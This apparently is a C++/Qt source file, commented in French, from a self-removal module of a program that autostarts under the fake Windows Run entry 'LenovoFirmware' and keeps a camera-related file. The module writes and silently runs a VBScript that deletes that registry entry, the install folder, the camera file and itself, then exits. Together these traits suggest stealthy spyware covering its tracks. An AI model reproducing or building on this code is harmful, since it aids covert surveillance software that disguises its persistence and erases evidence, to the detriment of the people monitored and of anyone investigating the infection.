#include <global.h>
#include <remove.h>

RemoveObject::RemoveObject(QObject *parent) : QObject(parent)
{
    timer = new QTimer(this);
    connect(timer, SIGNAL(timeout()), this, SLOT(shutdown()));
}

void RemoveObject::start()
{
    // Création et paramétrage de l'objet fichier //
    QFile file(GLOBAL_scriptPath + "/Delete.vbs");

    // Ouverture du fichier en lecture seule et vérification de l'ouverture //
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text))return;

    // Création d'un objet d'écriture de fichier //
    QTextStream flux(&file);

    // Paramétrage codec du jeu de caractère en UTF-8 //
    flux.setCodec("UTF-8");

    // Écriture des commandes dans le fichier //
    flux << "on error resume next\n";

    flux << "WScript.Sleep 3000  \n";
    flux << "Set Shell = WScript.CreateObject(\"WScript.Shell\") \n";
    flux << "Shell.RegDelete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\LenovoFirmware\" \n";

    flux << "Set ScrObj = CreateObject(\"Scripting.FileSystemObject\")\n";
    flux << "ScrObj.DeleteFolder \"" << GLOBAL_runInstallPath.left(GLOBAL_runInstallPath.size()-1) << "\" , True \n";
    flux << "ScrObj.DeleteFile(\"" << GLOBAL_cameraPath << "\")\n";
    flux << "ScrObj.DeleteFile(\"" << GLOBAL_scriptPath + "/Delete.vbs" << "\")\n";

    // Définition de l'objet //
    QProcess *launch;
    launch = new QProcess();

    // Lancement de l'objet //
    launch->startDetached("Wscript.exe" ,QStringList() << GLOBAL_scriptPath + "/Delete.vbs" );

    // Lancement de la séquence d'arrêt du programme //
    timer->start(1000);
}

void RemoveObject::shutdown()
{
    // Arrêt du programme //
    exit(0);
}

